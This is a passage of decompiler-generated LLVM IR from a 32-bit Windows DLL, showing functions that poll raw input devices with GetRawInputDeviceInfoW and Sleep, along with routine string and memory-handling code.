  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %ebx.1.reload = load i32, i32* %ebx.1.reg2mem
  %28 = add i32 %esp.1.reload, 20, !insn.addr !1816
  %29 = inttoptr i32 %28 to i32*, !insn.addr !1816
  store i32 0, i32* %29, align 4, !insn.addr !1816
  %30 = add i32 %esp.1.reload, -4, !insn.addr !1817
  %31 = inttoptr i32 %30 to i32*, !insn.addr !1817
  store i32 2, i32* %31, align 4, !insn.addr !1817
  %32 = call i32 @"??2@YAPAXI@Z"(i32 ptrtoint (i32* @1 to i32)), !insn.addr !1818
  %33 = add i32 %esp.1.reload, 28, !insn.addr !1819
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1819
  store i32 %32, i32* %34, align 4, !insn.addr !1819
  %35 = add i32 %esp.1.reload, 32, !insn.addr !1820
  %36 = inttoptr i32 %35 to i32*, !insn.addr !1820
  store i32 32, i32* %36, align 4, !insn.addr !1820
  store i32 32, i32* %29, align 4, !insn.addr !1821
  store i32 %28, i32* %31, align 4, !insn.addr !1822
  %37 = add i32 %esp.1.reload, -8, !insn.addr !1823
  %38 = inttoptr i32 %37 to i32*, !insn.addr !1823
  store i32 %35, i32* %38, align 4, !insn.addr !1823
  %39 = add i32 %esp.1.reload, 24, !insn.addr !1824
  %40 = inttoptr i32 %39 to i32*, !insn.addr !1824
  %41 = load i32, i32* %40, align 4, !insn.addr !1824
  %42 = add i32 %esp.1.reload, -12, !insn.addr !1825
  %43 = inttoptr i32 %42 to i32*, !insn.addr !1825
  store i32 536870923, i32* %43, align 4, !insn.addr !1825
  %44 = mul i32 %edi.0.reload, 8, !insn.addr !1826
  %45 = add i32 %41, %44, !insn.addr !1826
  %46 = inttoptr i32 %45 to i32*, !insn.addr !1826
  %47 = load i32, i32* %46, align 4, !insn.addr !1826
  %48 = add i32 %esp.1.reload, -16, !insn.addr !1826
  %49 = inttoptr i32 %48 to i32*, !insn.addr !1826
  store i32 %47, i32* %49, align 4, !insn.addr !1826
  %50 = call i32 @GetRawInputDeviceInfoW(i32* nonnull @1, i32 ptrtoint (i32* @1 to i32), i32* nonnull @1, i32* nonnull @1), !insn.addr !1827
  %51 = load i32, i32* %29, align 4, !insn.addr !1828
  %52 = icmp eq i32 %51, 1, !insn.addr !1828
  %53 = icmp eq i1 %52, false, !insn.addr !1829
  store i32 %ebx.1.reload, i32* %ebx.2.reg2mem, !insn.addr !1829
  store i32 %esi.0.reload, i32* %esi.1.reg2mem, !insn.addr !1829
  br i1 %53, label %dec_label_pc_100042e4, label %dec_label_pc_100042ad, !insn.addr !1829

dec_label_pc_100042ad:                            ; preds = %dec_label_pc_10004250
  %54 = add i32 %esp.1.reload, 44, !insn.addr !1830
  %55 = inttoptr i32 %54 to i32*, !insn.addr !1830
  %56 = load i32, i32* %55, align 4, !insn.addr !1830
  %57 = icmp eq i32 %56, 136, !insn.addr !1830
  %58 = icmp eq i1 %57, false, !insn.addr !1831
  store i32 %ebx.1.reload, i32* %ebx.2.reg2mem, !insn.addr !1831
  store i32 %esi.0.reload, i32* %esi.1.reg2mem, !insn.addr !1831
  br i1 %58, label %dec_label_pc_100042e4, label %dec_label_pc_100042b7, !insn.addr !1831

dec_label_pc_100042b7:                            ; preds = %dec_label_pc_100042ad
  %59 = add i32 %esi.0.reload, 1, !insn.addr !1832
  %60 = icmp eq i32 %ebx.1.reload, 0, !insn.addr !1833
  br i1 %60, label %dec_label_pc_100042c2, label %dec_label_pc_100042bc, !insn.addr !1834

dec_label_pc_100042bc:                            ; preds = %dec_label_pc_100042b7
  %61 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !1835
  %62 = load i32, i32* %61, align 4, !insn.addr !1835
  %63 = icmp sgt i32 %59, %62, !insn.addr !1836
  store i32 %ebx.1.reload, i32* %ebx.2.reg2mem, !insn.addr !1836
  store i32 %59, i32* %esi.1.reg2mem, !insn.addr !1836
  br i1 %63, label %dec_label_pc_100042c2, label %dec_label_pc_100042e4, !insn.addr !1836

dec_label_pc_100042c2:                            ; preds = %dec_label_pc_100042bc, %dec_label_pc_100042b7
  %64 = call i32 @function_10006810(), !insn.addr !1837
  %65 = add i32 %esp.1.reload, -20, !insn.addr !1838
  %66 = inttoptr i32 %65 to i32*, !insn.addr !1838
  store i32 %64, i32* %66, align 4, !insn.addr !1838
  %67 = call i32 @function_10006af0(i32 ptrtoint (i32* @1 to i32)), !insn.addr !1839
  %68 = call i32 @function_10004100(), !insn.addr !1840
  %69 = call i32 @function_10003d90(), !insn.addr !1841
  store i32 1, i32* %ebx.2.reg2mem, !insn.addr !1842
  store i32 %59, i32* %esi.1.reg2mem, !insn.addr !1842
  br label %dec_label_pc_100042e4, !insn.addr !1842

dec_label_pc_100042e4:                            ; preds = %dec_label_pc_100042bc, %dec_label_pc_100042c2, %dec_label_pc_100042ad, %dec_label_pc_10004250
  %esi.1.reload = load i32, i32* %esi.1.reg2mem
  %ebx.2.reload = load i32, i32* %ebx.2.reg2mem
  %70 = add i32 %esp.1.reload, 12, !insn.addr !1843
  %71 = inttoptr i32 %70 to i32*, !insn.addr !1843
  %72 = load i32, i32* %71, align 4, !insn.addr !1843
  %73 = add i32 %esp.1.reload, -20, !insn.addr !1843
  %74 = inttoptr i32 %73 to i32*, !insn.addr !1843
  store i32 %72, i32* %74, align 4, !insn.addr !1843
  %75 = call i32 @function_1000f4b1(), !insn.addr !1844
  %76 = add nuw i32 %edi.0.reload, 1, !insn.addr !1845
  %77 = load i32, i32* %31, align 4, !insn.addr !1846
  %78 = icmp ult i32 %76, %77, !insn.addr !1846
  store i32 %ebx.2.reload, i32* %ebx.1.reg2mem, !insn.addr !1847
  store i32 %48, i32* %esp.1.reg2mem, !insn.addr !1847
  store i32 %esi.1.reload, i32* %esi.0.reg2mem, !insn.addr !1847
  store i32 %76, i32* %edi.0.reg2mem, !insn.addr !1847
  store i32 %ebx.2.reload, i32* %ebx.3.reg2mem, !insn.addr !1847
  store i32 %48, i32* %esp.3.reg2mem, !insn.addr !1847
  store i32 %esi.1.reload, i32* %esi.2.reg2mem, !insn.addr !1847
  br i1 %78, label %dec_label_pc_10004250, label %dec_label_pc_100042fb, !insn.addr !1847

dec_label_pc_100042fb:                            ; preds = %dec_label_pc_100042e4, %dec_label_pc_100041f5
  %esi.2.reload = load i32, i32* %esi.2.reg2mem
  %esp.3.reload = load i32, i32* %esp.3.reg2mem
  %ebx.3.reload = load i32, i32* %ebx.3.reg2mem
  %79 = icmp eq i32 %ebx.3.reload, 1, !insn.addr !1848
  %80 = icmp eq i1 %79, false, !insn.addr !1849
  %.pre = add i32 %esp.3.reload, 16
  %.pre1 = inttoptr i32 %.pre to i32*
  store i32 %ebx.3.reload, i32* %ebx.4.reg2mem, !insn.addr !1849
  br i1 %80, label %dec_label_pc_1000431b, label %dec_label_pc_10004300, !insn.addr !1849

dec_label_pc_10004300:                            ; preds = %dec_label_pc_100042fb
  %81 = load i32, i32* %.pre1, align 4, !insn.addr !1850
  %82 = icmp sgt i32 %81, %esi.2.reload, !insn.addr !1851
  store i32 %ebx.3.reload, i32* %ebx.4.reg2mem, !insn.addr !1851
  br i1 %82, label %dec_label_pc_10004306, label %dec_label_pc_1000431b, !insn.addr !1851

dec_label_pc_10004306:                            ; preds = %dec_label_pc_10004300
  %83 = call i32 @function_10006810(), !insn.addr !1852
  %84 = add i32 %esp.3.reload, -4, !insn.addr !1853
  %85 = inttoptr i32 %84 to i32*, !insn.addr !1853
  store i32 %83, i32* %85, align 4, !insn.addr !1853
  %86 = call i32 @function_10006af0(i32 ptrtoint (i32* @1 to i32)), !insn.addr !1854
  store i32 0, i32* %ebx.4.reg2mem, !insn.addr !1855
  br label %dec_label_pc_1000431b, !insn.addr !1855

dec_label_pc_1000431b:                            ; preds = %dec_label_pc_100042fb, %dec_label_pc_10004300, %dec_label_pc_10004306
  %ebx.4.reload = load i32, i32* %ebx.4.reg2mem
  %87 = add i32 %esp.3.reload, 24, !insn.addr !1856
  %88 = inttoptr i32 %87 to i32*, !insn.addr !1856
  %89 = load i32, i32* %88, align 4, !insn.addr !1856
  %90 = add i32 %esp.3.reload, -4, !insn.addr !1856
  %91 = inttoptr i32 %90 to i32*, !insn.addr !1856
  store i32 %89, i32* %91, align 4, !insn.addr !1856
  store i32 %esi.2.reload, i32* %.pre1, align 4, !insn.addr !1857
  %92 = call i32 @function_1000f4b1(), !insn.addr !1858
  store i32 10, i32* %91, align 4, !insn.addr !1859
  call void @Sleep(i32 ptrtoint (i32* @1 to i32)), !insn.addr !1860
  store i32 %ebx.4.reload, i32* %ebx.0.reg2mem, !insn.addr !1861
  store i32 %90, i32* %esp.0.reg2mem, !insn.addr !1861
  br label %dec_label_pc_100041f5, !insn.addr !1861
}

define i32 @function_10004340() local_unnamed_addr {
dec_label_pc_10004340:
  %eax.0.reg2mem = alloca i32, !insn.addr !1862
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = icmp eq i32 %0, 0, !insn.addr !1863
  %.pre = inttoptr i32 %0 to i32*
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1864
  br i1 %1, label %dec_label_pc_10004352, label %dec_label_pc_10004349, !insn.addr !1864

dec_label_pc_10004349:                            ; preds = %dec_label_pc_10004340
  call void @_free(i32* %.pre), !insn.addr !1865
  store i32 ptrtoint (i32* @1 to i32), i32* %eax.0.reg2mem, !insn.addr !1866
  br label %dec_label_pc_10004352, !insn.addr !1866

dec_label_pc_10004352:                            ; preds = %dec_label_pc_10004340, %dec_label_pc_10004349
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  store i32 0, i32* %.pre, align 4, !insn.addr !1867
  ret i32 %eax.0.reload, !insn.addr !1868
}

define i32 @function_10004360(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10004360:
  %ecx.2.reg2mem = alloca i32, !insn.addr !1869
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !1869
  %ecx.0.reg2mem = alloca i32, !insn.addr !1869
  %.reg2mem3 = alloca i32, !insn.addr !1869
  %.reg2mem = alloca i32, !insn.addr !1869
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @__decompiler_undefined_function_1()
  %3 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %4 = add i32 %3, 16, !insn.addr !1870
  %5 = inttoptr i32 %4 to i32*, !insn.addr !1870
  %6 = load i32, i32* %5, align 4, !insn.addr !1870
  %7 = sub i32 0, %6
  %8 = sub i32 %7, 1
  %9 = icmp ugt i32 %8, %arg1
  br i1 %9, label %dec_label_pc_1000437a, label %dec_label_pc_10004420, !insn.addr !1871

dec_label_pc_1000437a:                            ; preds = %dec_label_pc_10004360
  %10 = icmp eq i32 %arg1, 0, !insn.addr !1872
  br i1 %10, label %dec_label_pc_10004417, label %dec_label_pc_10004385, !insn.addr !1873

dec_label_pc_10004385:                            ; preds = %dec_label_pc_1000437a
  %11 = add i32 %6, %arg1, !insn.addr !1874
  %12 = icmp eq i32 %11, 0, !insn.addr !1875
  %13 = icmp eq i1 %12, false, !insn.addr !1876
  br i1 %13, label %dec_label_pc_100043ac, label %dec_label_pc_10004389, !insn.addr !1876

dec_label_pc_10004389:                            ; preds = %dec_label_pc_10004385
  store i32 %11, i32* %5, align 4, !insn.addr !1877
  %14 = add i32 %3, 20, !insn.addr !1878
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1878
  %16 = load i32, i32* %15, align 4, !insn.addr !1878
  %17 = icmp ult i32 %16, 16, !insn.addr !1878
  br i1 %17, label %dec_label_pc_100043a0, label %dec_label_pc_10004392, !insn.addr !1879

dec_label_pc_10004392:                            ; preds = %dec_label_pc_10004389
  %18 = inttoptr i32 %6 to i8*, !insn.addr !1880
  store i8 0, i8* %18, align 1, !insn.addr !1880
  ret i32 %3, !insn.addr !1881

dec_label_pc_100043a0:                            ; preds = %dec_label_pc_10004389
  %19 = inttoptr i32 %3 to i8*, !insn.addr !1882
  store i8 0, i8* %19, align 1, !insn.addr !1882
  ret i32 %3, !insn.addr !1883

dec_label_pc_100043ac:                            ; preds = %dec_label_pc_10004385
  %20 = add i32 %3, 20, !insn.addr !1884
  %21 = inttoptr i32 %20 to i32*, !insn.addr !1884
  %22 = load i32, i32* %21, align 4
  %23 = icmp ult i32 %22, %11, !insn.addr !1884
  %24 = icmp eq i1 %23, false, !insn.addr !1885
  store i32 %6, i32* %.reg2mem, !insn.addr !1885
  store i32 %22, i32* %.reg2mem3, !insn.addr !1885
  store i32 %6, i32* %ecx.0.reg2mem, !insn.addr !1885
  store i32* %stack_var_-16, i32** %esp.0.in.reg2mem, !insn.addr !1885
  br i1 %24, label %dec_label_pc_100043b9, label %dec_label_pc_100043b1, !insn.addr !1885

dec_label_pc_100043b1:                            ; preds = %dec_label_pc_100043ac
  store i32 %11, i32* %stack_var_-20, align 4, !insn.addr !1886
  %25 = call i32 @function_10005f40(i32 %11, i32 %0, i32 %1, i32 %2), !insn.addr !1887
  %.pr = load i32, i32* %21, align 4
  %.pre = load i32, i32* %5, align 4
  store i32 %.pre, i32* %.reg2mem, !insn.addr !1887
  store i32 %.pr, i32* %.reg2mem3, !insn.addr !1887
  store i32* %stack_var_-20, i32** %esp.0.in.reg2mem, !insn.addr !1887
  br label %dec_label_pc_100043b9, !insn.addr !1887

dec_label_pc_100043b9:                            ; preds = %dec_label_pc_100043b1, %dec_label_pc_100043ac
  %sext = mul i32 %arg2, 16777216
  %26 = sdiv i32 %sext, 16777216
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %.reload4 = load i32, i32* %.reg2mem3
  %.reload = load i32, i32* %.reg2mem, !insn.addr !1888
  %27 = icmp eq i32 %arg1, 1, !insn.addr !1889
  %28 = icmp eq i1 %27, false, !insn.addr !1890
  %29 = icmp ult i32 %.reload4, 16
  br i1 %28, label %dec_label_pc_100043db, label %dec_label_pc_100043c1, !insn.addr !1890

dec_label_pc_100043c1:                            ; preds = %dec_label_pc_100043b9
  %30 = trunc i32 %26 to i8
  br i1 %29, label %dec_label_pc_100043d1, label %dec_label_pc_100043c7, !insn.addr !1891

dec_label_pc_100043c7:                            ; preds = %dec_label_pc_100043c1
  %31 = add i32 %ecx.0.reload, %.reload, !insn.addr !1892
  %32 = inttoptr i32 %31 to i8*, !insn.addr !1892
  store i8 %30, i8* %32, align 1, !insn.addr !1892
  store i32 %ecx.0.reload, i32* %ecx.2.reg2mem, !insn.addr !1893
  br label %dec_label_pc_100043f9, !insn.addr !1893

dec_label_pc_100043d1:                            ; preds = %dec_label_pc_100043c1
  %33 = add i32 %.reload, %3, !insn.addr !1894
  %34 = inttoptr i32 %33 to i8*, !insn.addr !1894
  store i8 %30, i8* %34, align 1, !insn.addr !1894
  br label %dec_label_pc_100043f9, !insn.addr !1895

dec_label_pc_100043db:                            ; preds = %dec_label_pc_100043b9
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %spec.select = select i1 %29, i32 %3, i32 %ecx.0.reload
  %35 = add i32 %esp.0, -4, !insn.addr !1896
  %36 = inttoptr i32 %35 to i32*, !insn.addr !1896
  store i32 %arg1, i32* %36, align 4, !insn.addr !1896
  %37 = add i32 %esp.0, -8, !insn.addr !1897
  %38 = inttoptr i32 %37 to i32*, !insn.addr !1897
  store i32 %26, i32* %38, align 4, !insn.addr !1897
  %39 = add i32 %spec.select, %.reload, !insn.addr !1898
  %40 = add i32 %esp.0, -12, !insn.addr !1899
  %41 = inttoptr i32 %40 to i32*, !insn.addr !1899
  store i32 %39, i32* %41, align 4, !insn.addr !1899
  %42 = call i32* @_memset(i32* nonnull @1, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !1900
  store i32 %spec.select, i32* %ecx.2.reg2mem, !insn.addr !1901
  br label %dec_label_pc_100043f9, !insn.addr !1901

dec_label_pc_100043f9:                            ; preds = %dec_label_pc_100043db, %dec_label_pc_100043d1, %dec_label_pc_100043c7
  %ecx.2.reload = load i32, i32* %ecx.2.reg2mem
  %43 = load i32, i32* %21, align 4, !insn.addr !1902
  %44 = icmp ult i32 %43, 16, !insn.addr !1902
  store i32 %11, i32* %5, align 4, !insn.addr !1903
  br i1 %44, label %dec_label_pc_10004411, label %dec_label_pc_10004402, !insn.addr !1904

dec_label_pc_10004402:                            ; preds = %dec_label_pc_100043f9
  %45 = add i32 %ecx.2.reload, %11, !insn.addr !1905
  %46 = inttoptr i32 %45 to i8*, !insn.addr !1905
  store i8 0, i8* %46, align 1, !insn.addr !1905
  ret i32 %3, !insn.addr !1906

dec_label_pc_10004411:                            ; preds = %dec_label_pc_100043f9
  %47 = add i32 %11, %3, !insn.addr !1907
  %48 = inttoptr i32 %47 to i8*, !insn.addr !1907
  store i8 0, i8* %48, align 1, !insn.addr !1907
  br label %dec_label_pc_10004417, !insn.addr !1907

dec_label_pc_10004417:                            ; preds = %dec_label_pc_10004411, %dec_label_pc_1000437a
  ret i32 %3, !insn.addr !1908

dec_label_pc_10004420:                            ; preds = %dec_label_pc_10004360
  %49 = call i32 @function_10004f70(i32 %0, i32 %1), !insn.addr !1909
  %50 = call i32 @__asm_int3(), !insn.addr !1910
  %51 = call i32 @__asm_int3(), !insn.addr !1911
  %52 = call i32 @__asm_int3(), !insn.addr !1912
  %53 = call i32 @__asm_int3(), !insn.addr !1913
  %54 = call i32 @__asm_int3(), !insn.addr !1914
  %55 = call i32 @__asm_int3(), !insn.addr !1915
  %56 = call i32 @__asm_int3(), !insn.addr !1916
  %57 = call i32 @__asm_int3(), !insn.addr !1917
  %58 = call i32 @__asm_int3(), !insn.addr !1918
  %59 = call i32 @__asm_int3(), !insn.addr !1919
  %60 = call i32 @__asm_int3(), !insn.addr !1920
  ret i32 %60, !insn.addr !1920
}

define i32 @function_10004430(i32 %arg1) local_unnamed_addr {
dec_label_pc_10004430:
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !1921
  %eax.0.reg2mem = alloca i32, !insn.addr !1921
  %edx.0.reg2mem = alloca i32, !insn.addr !1921
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-60 = alloca i8, align 1
  %stack_var_-20 = alloca i32, align 4
  %2 = add i32 %0, 20, !insn.addr !1922
  %3 = inttoptr i32 %2 to i32*, !insn.addr !1922
  %4 = load i32, i32* %3, align 4, !insn.addr !1922
  %5 = icmp ult i32 %4, 16, !insn.addr !1923
  store i32 %4, i32* %eax.0.reg2mem, !insn.addr !1924
  br i1 %5, label %dec_label_pc_10004468, label %dec_label_pc_1000443b, !insn.addr !1924

dec_label_pc_1000443b:                            ; preds = %dec_label_pc_10004430
  %6 = add i32 %4, 1, !insn.addr !1925
  %7 = icmp ult i32 %6, 4096, !insn.addr !1926
  br i1 %7, label %dec_label_pc_1000445f, label %dec_label_pc_10004445, !insn.addr !1927

dec_label_pc_10004445:                            ; preds = %dec_label_pc_1000443b
  %8 = and i32 %0, 31
  %9 = icmp eq i32 %8, 0, !insn.addr !1928
  %10 = icmp eq i1 %9, false, !insn.addr !1929
  br i1 %10, label %dec_label_pc_1000447b, label %dec_label_pc_1000444a, !insn.addr !1929

dec_label_pc_1000444a:                            ; preds = %dec_label_pc_10004445
  %11 = add i32 %0, -4, !insn.addr !1930
  %12 = inttoptr i32 %11 to i32*, !insn.addr !1930
  %13 = load i32, i32* %12, align 4, !insn.addr !1930
  %14 = icmp ugt i32 %0, %13, !insn.addr !1931
  %15 = icmp eq i1 %14, false, !insn.addr !1932
  br i1 %15, label %dec_label_pc_10004480, label %dec_label_pc_10004451, !insn.addr !1932

dec_label_pc_10004451:                            ; preds = %dec_label_pc_1000444a
  %16 = sub i32 %0, %13, !insn.addr !1933
  %17 = icmp ult i32 %16, 4, !insn.addr !1934
  br i1 %17, label %dec_label_pc_10004485, label %dec_label_pc_10004458, !insn.addr !1935

dec_label_pc_10004458:                            ; preds = %dec_label_pc_10004451
  %18 = icmp ult i32 %16, 36
  store i32 %13, i32* %edx.0.reg2mem, !insn.addr !1936
  br i1 %18, label %dec_label_pc_1000445f, label %dec_label_pc_1000448a, !insn.addr !1936

dec_label_pc_1000445f:                            ; preds = %dec_label_pc_10004458, %dec_label_pc_1000443b
  %edx.0.reload = load i32, i32* %edx.0.reg2mem
  %19 = inttoptr i32 %edx.0.reload to i32*, !insn.addr !1937
  call void @_free(i32* %19), !insn.addr !1937
  store i32 ptrtoint (i32* @1 to i32), i32* %eax.0.reg2mem, !insn.addr !1938
  br label %dec_label_pc_10004468, !insn.addr !1938

dec_label_pc_10004468:                            ; preds = %dec_label_pc_1000445f, %dec_label_pc_10004430
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %20 = add i32 %0, 16, !insn.addr !1939
  %21 = inttoptr i32 %20 to i32*, !insn.addr !1939
  store i32 0, i32* %21, align 4, !insn.addr !1939
  store i32 15, i32* %3, align 4, !insn.addr !1940
  %22 = inttoptr i32 %0 to i8*, !insn.addr !1941
  store i8 0, i8* %22, align 1, !insn.addr !1941
  ret i32 %eax.0.reload, !insn.addr !1942

dec_label_pc_1000447b:                            ; preds = %dec_label_pc_10004445
  %23 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !1943
  br label %dec_label_pc_10004480, !insn.addr !1943

dec_label_pc_10004480:                            ; preds = %dec_label_pc_1000447b, %dec_label_pc_1000444a
  %24 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !1944
  br label %dec_label_pc_10004485, !insn.addr !1944

dec_label_pc_10004485:                            ; preds = %dec_label_pc_10004480, %dec_label_pc_10004451
  %25 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !1945
  br label %dec_label_pc_1000448a, !insn.addr !1945

dec_label_pc_1000448a:                            ; preds = %dec_label_pc_10004458, %dec_label_pc_10004485
  %26 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !1946
  %27 = call i32 @__asm_int3(), !insn.addr !1947
  %28 = call i32 @__readfsdword(i32 0), !insn.addr !1948
  store i32 %28, i32* %stack_var_-20, align 4, !insn.addr !1949
  %29 = ptrtoint i32* %stack_var_-20 to i32, !insn.addr !1950
  call void @__writefsdword(i32 0, i32 %29), !insn.addr !1951
  %30 = load i32, i32* @global_var_1003df80, align 4, !insn.addr !1952
  %31 = add i32 %30, 4, !insn.addr !1953
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1953
  %33 = load i32, i32* %32, align 4, !insn.addr !1953
  %34 = add i32 %33, ptrtoint (i32* @global_var_1003df8c to i32), !insn.addr !1954
  %35 = inttoptr i32 %34 to i32*, !insn.addr !1954
  %36 = load i32, i32* %35, align 4, !insn.addr !1954
  %37 = icmp eq i32 %36, 0, !insn.addr !1954
  %38 = icmp eq i1 %37, false, !insn.addr !1955
  br i1 %38, label %dec_label_pc_10004614, label %dec_label_pc_10004531, !insn.addr !1956

dec_label_pc_10004531:                            ; preds = %dec_label_pc_1000448a
  %39 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !1957
  store i32 %39, i32* %stack_var_-80, align 4, !insn.addr !1957
  store i32 %39, i32* %stack_var_-84, align 4, !insn.addr !1958
  %40 = call i32 @function_10006c80(i32* nonnull %stack_var_-52, i32* nonnull %stack_var_-52), !insn.addr !1959
  %41 = icmp eq i32 %1, 0, !insn.addr !1960
  %42 = icmp eq i32 %40, 0, !insn.addr !1961
  %or.cond5 = or i1 %41, %42
  store i32* %stack_var_-80, i32** %esp.0.in.reg2mem, !insn.addr !1962
  br i1 %or.cond5, label %dec_label_pc_1000456b, label %dec_label_pc_10004563, !insn.addr !1962

dec_label_pc_10004563:                            ; preds = %dec_label_pc_10004531
  store i32 1, i32* %stack_var_-84, align 4, !insn.addr !1963
  store i32* %stack_var_-84, i32** %esp.0.in.reg2mem, !insn.addr !1964
  br label %dec_label_pc_1000456b, !insn.addr !1964

dec_label_pc_1000456b:                            ; preds = %dec_label_pc_10004563, %dec_label_pc_10004531
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %43 = add i32 %esp.0, -4, !insn.addr !1965
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1965
  store i32 %arg1, i32* %44, align 4, !insn.addr !1965
  %45 = load i32, i32* @global_var_1003df80, align 4, !insn.addr !1966
  %46 = add i32 %45, 4, !insn.addr !1967
  %47 = inttoptr i32 %46 to i32*, !insn.addr !1967
  %48 = load i32, i32* %47, align 4, !insn.addr !1967
  %49 = add i32 %48, ptrtoint (i32* @global_var_1003dfb8 to i32), !insn.addr !1968
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1968
  %51 = load i32, i32* %50, align 4, !insn.addr !1968
  %52 = add i32 %48, ptrtoint (i32* @global_var_1003df80 to i32), !insn.addr !1969
  store i8 0, i8* %stack_var_-60, align 1, !insn.addr !1970
  %53 = add i32 %48, ptrtoint (i8** @global_var_1003dfc0 to i32), !insn.addr !1971
  %54 = inttoptr i32 %53 to i8*, !insn.addr !1971
  %55 = load i8, i8* %54, align 1, !insn.addr !1971
  %56 = sext i8 %55 to i32, !insn.addr !1972
  %57 = add i32 %esp.0, -8, !insn.addr !1972
  %58 = inttoptr i32 %57 to i32*, !insn.addr !1972
  store i32 %56, i32* %58, align 4, !insn.addr !1972
  %59 = add i32 %esp.0, -12, !insn.addr !1973
  %60 = inttoptr i32 %59 to i32*, !insn.addr !1973
  store i32 %52, i32* %60, align 4, !insn.addr !1973
  %61 = add i32 %esp.0, -16, !insn.addr !1974
  %62 = inttoptr i32 %61 to i32*, !insn.addr !1974
  store i32 %51, i32* %62, align 4, !insn.addr !1974
  %63 = add i32 %esp.0, -20, !insn.addr !1975
  %64 = inttoptr i32 %63 to i32*, !insn.addr !1975
  store i32 0, i32* %64, align 4, !insn.addr !1975
  %65 = add i32 %esp.0, -24, !insn.addr !1976
  %66 = inttoptr i32 %65 to i32*, !insn.addr !1976
  %67 = ptrtoint i8* %stack_var_-60 to i32, !insn.addr !1976
  store i32 %67, i32* %66, align 4, !insn.addr !1976
  br label %dec_label_pc_10004614

dec_label_pc_10004614:                            ; preds = %dec_label_pc_1000456b, %dec_label_pc_1000448a
  %68 = call i32 @function_1000e737(), !insn.addr !1977
  %69 = trunc i32 %68 to i8, !insn.addr !1978
  %70 = icmp eq i8 %69, 0, !insn.addr !1978
  %71 = icmp eq i1 %70, false, !insn.addr !1979
  br i1 %71, label %dec_label_pc_1000462e, label %dec_label_pc_10004624, !insn.addr !1979

dec_label_pc_10004624:                            ; preds = %dec_label_pc_10004614
  %72 = call i32 @function_10006260(), !insn.addr !1980
  br label %dec_label_pc_1000462e, !insn.addr !1980

dec_label_pc_1000462e:                            ; preds = %dec_label_pc_10004624, %dec_label_pc_10004614
  %73 = load i32, i32* %stack_var_-20, align 4, !insn.addr !1981
  call void @__writefsdword(i32 0, i32 %73), !insn.addr !1982
  ret i32 ptrtoint (i32* @global_var_1003df80 to i32), !insn.addr !1983
}

define i32 @function_10004670() local_unnamed_addr {
dec_label_pc_10004670:
  %0 = call i32 @__decompiler_undefined_function_1()
  ret i32 %0, !insn.addr !1984
}

define i32 @function_10004680() local_unnamed_addr {
dec_label_pc_10004680:
  %eax.0.reg2mem = alloca i32, !insn.addr !1985
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-16 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1986
  store i32 %1, i32* %stack_var_-16, align 4, !insn.addr !1987
  %2 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1988
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1989
  %3 = call i32 @function_1000e737(), !insn.addr !1990
  %4 = trunc i32 %3 to i8, !insn.addr !1991
  %5 = icmp eq i8 %4, 0, !insn.addr !1991
  %6 = icmp eq i1 %5, false, !insn.addr !1992
  br i1 %6, label %dec_label_pc_100046b6, label %dec_label_pc_100046af, !insn.addr !1992

dec_label_pc_100046af:                            ; preds = %dec_label_pc_10004680
  %7 = call i32 @function_10006260(), !insn.addr !1993
  br label %dec_label_pc_100046b6, !insn.addr !1993

dec_label_pc_100046b6:                            ; preds = %dec_label_pc_100046af, %dec_label_pc_10004680
  %8 = add i32 %0, 4, !insn.addr !1994
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1994
  %10 = load i32, i32* %9, align 4, !insn.addr !1994
  %11 = add i32 %0, 56, !insn.addr !1995
  %12 = add i32 %11, %10, !insn.addr !1995
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1995
  %14 = load i32, i32* %13, align 4, !insn.addr !1995
  %15 = icmp eq i32 %14, 0, !insn.addr !1996
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !1997
  br i1 %15, label %dec_label_pc_100046d1, label %dec_label_pc_100046cc, !insn.addr !1997

dec_label_pc_100046cc:                            ; preds = %dec_label_pc_100046b6
  %16 = inttoptr i32 %14 to i32*, !insn.addr !1998
  %17 = load i32, i32* %16, align 4, !insn.addr !1998
  store i32 %17, i32* %eax.0.reg2mem, !insn.addr !1999
  br label %dec_label_pc_100046d1, !insn.addr !1999

dec_label_pc_100046d1:                            ; preds = %dec_label_pc_100046cc, %dec_label_pc_100046b6
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %18 = load i32, i32* %stack_var_-16, align 4, !insn.addr !2000
